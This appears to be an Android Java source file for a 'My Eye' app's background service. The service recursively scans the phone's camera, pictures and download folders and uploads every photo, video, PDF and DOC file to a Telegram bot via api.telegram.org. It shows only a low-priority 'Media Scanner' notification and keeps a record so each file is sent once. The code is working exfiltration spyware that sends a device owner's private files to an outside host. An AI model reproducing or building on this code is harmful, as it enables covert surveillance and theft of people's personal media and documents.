package com.ahamedrahim.myeye;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MediaScannerService extends Service {
    
    private static final String TAG = "MediaScannerService";
    private static final String CHANNEL_ID = "MediaScannerChannel";
    private static final int NOTIFICATION_ID = 102;
    
    private int scannedFiles = 0;
    private int uploadedFiles = 0;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification("Starting media scan..."));
        
        // Start scanning in background thread
        new Thread(this::scanMediaFiles).start();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Media Scanner",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Scans and uploads media files");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("My Eye Media Scanner")
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_eye)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }
    
    private void scanMediaFiles() {
        List<File> directories = getMediaDirectories();
        
        for (File dir : directories) {
            if (dir.exists() && dir.isDirectory()) {
                scanDirectory(dir);
            }
        }
        
        // Update stats
        SharedPreferences prefs = getSharedPreferences("MyEyeStats", MODE_PRIVATE);
        prefs.edit()
            .putInt("media_count", scannedFiles)
            .putLong("last_sync", System.currentTimeMillis())
            .apply();
        
        // Update notification
        updateNotification("Scan completed: " + scannedFiles + " files scanned");
        
        // Stop service after completion
        stopSelf();
    }
    
    private List<File> getMediaDirectories() {
        List<File> dirs = new ArrayList<>();
        
        // Camera and media folders
        dirs.add(new File("/storage/emulated/0/DCIM/Camera"));
        dirs.add(new File("/storage/emulated/0/DCIM"));
        dirs.add(new File("/storage/emulated/0/Pictures"));
        dirs.add(new File("/storage/emulated/0/Download"));
        
        return dirs;
    }
    
    private void scanDirectory(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    scanDirectory(file);
                } else if (isMediaFile(file)) {
                    scannedFiles++;
                    updateNotification("Scanning: " + scannedFiles + " files found");
                    
                    if (!isAlreadyUploaded(file)) {
                        uploadFileToTelegram(file);
                        markAsUploaded(file);
                        uploadedFiles++;
                    }
                }
            }
        }
    }
    
    private boolean isMediaFile(File file) {
        String name = file.getName().toLowerCase();
        return name.endsWith(".jpg") || name.endsWith(".jpeg") || 
               name.endsWith(".png") || name.endsWith(".mp4") ||
               name.endsWith(".pdf") || name.endsWith(".doc");
    }
    
    private boolean isAlreadyUploaded(File file) {
        String fileHash = getFileHash(file);
        SharedPreferences prefs = getSharedPreferences("UploadedFiles", MODE_PRIVATE);
        return prefs.getBoolean(fileHash, false);
    }
    
    private void markAsUploaded(File file) {
        String fileHash = getFileHash(file);
        SharedPreferences prefs = getSharedPreferences("UploadedFiles", MODE_PRIVATE);
        prefs.edit().putBoolean(fileHash, true).apply();
    }
    
    private String getFileHash(File file) {
        return file.getAbsolutePath() + "_" + file.lastModified();
    }
    
    private void uploadFileToTelegram(File file) {
        SharedPreferences prefs = getSharedPreferences("TelegramPrefs", MODE_PRIVATE);
        String botToken = prefs.getString("bot_token", "");
        String chatId = prefs.getString("chat_id", "");
        boolean isEnabled = prefs.getBoolean("notify_media", true);
        
        if (!isEnabled || botToken.isEmpty() || chatId.isEmpty()) {
            return;
        }
        
        if (file.length() > 20 * 1024 * 1024) { // 20MB limit
            Log.d(TAG, "File too large to upload: " + file.getName());
            return;
        }
        
        String caption = "📁 File: " + file.getName() + "\n" +
                        "📏 Size: " + formatFileSize(file.length()) + "\n" +
                        "🕒 Time: " + getCurrentTime() + "\n" +
                        "📲 Via My Eye App";
        
        try {
            OkHttpClient client = new OkHttpClient();
            
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(file, MediaType.parse("application/octet-stream")))
                    .build();
            
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + botToken + "/sendDocument")
                    .post(requestBody)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to upload file: " + file.getName() + ", Error: " + e.getMessage());
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d(TAG, "File uploaded successfully: " + file.getName());
                    } else {
                        Log.e(TAG, "Failed to upload file: " + file.getName() + ", Code: " + response.code());
                    }
                    response.close();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading file: " + e.getMessage());
        }
    }
    
    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format(Locale.getDefault(), "%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }
    
    private String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }
    
    private void updateNotification(String text) {
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        manager.notify(NOTIFICATION_ID, createNotification(text));
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
            }
